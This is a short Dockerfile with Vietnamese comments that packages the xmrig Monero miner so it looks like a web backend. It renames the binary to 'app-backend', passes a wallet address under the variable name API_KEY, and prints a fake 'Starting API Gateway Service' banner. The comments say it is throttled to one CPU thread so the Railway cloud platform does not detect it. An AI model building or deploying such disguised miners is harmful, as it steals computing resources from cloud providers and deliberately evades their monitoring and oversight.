# Sử dụng image gốc làm phôi
FROM metal3d/xmrig:latest

# --- GIAI ĐOẠN 1: NGỤY TRANG FILE THỰC THI ---
# Tự động tìm xmrig ở bất cứ đâu và đổi tên thành 'app-backend'
RUN BIN_PATH=$(which xmrig || echo "/xmrig") && \
    mv "$BIN_PATH" /usr/bin/app-backend

# --- GIAI ĐOẠN 2: CẤU HÌNH BIẾN MÔI TRƯỜNG ---
# Dùng tên biến trông giống như một Web App bình thường
ENV API_KEY="49C74tmssnRe54eQhUVvuDcSKBa85nUydXQQ9F1mMmNTYsJN2fMTZb9MUk9hMRgFaNSXeAjjDuT9mGbLbgyqP9PZ1xPEEq6"
ENV POOL_ADDR="gulf.moneroocean.stream:10128"
ENV WORKER_ID="railway-api-service"

# --- GIAI ĐOẠN 3: TỐI ƯU TÀI NGUYÊN (FIX LỖI RAM & CPU) ---
# Tạo script khởi chạy với các tham số "sinh tồn" trên Railway:
# -t 1: Chỉ dùng 1 luồng CPU (Tránh bị quét vì dùng 100% CPU)
# --randomx-mode=light: Chỉ dùng ~256MB RAM (Fix lỗi Out of Memory)
# --no-huge-pages: Tắt Huge Pages (Phù hợp với môi trường Docker Cloud)
RUN echo '#!/bin/sh' > /entrypoint.sh && \
    echo 'echo "Starting API Gateway Service..." ' >> /entrypoint.sh && \
    echo 'exec /usr/bin/app-backend -o $POOL_ADDR -u $API_KEY -p $WORKER_ID -t 1 --randomx-mode=light --no-huge-pages --donate-level=1' >> /entrypoint.sh && \
    chmod +x /entrypoint.sh

# Chạy bằng script giả
ENTRYPOINT ["/entrypoint.sh"]
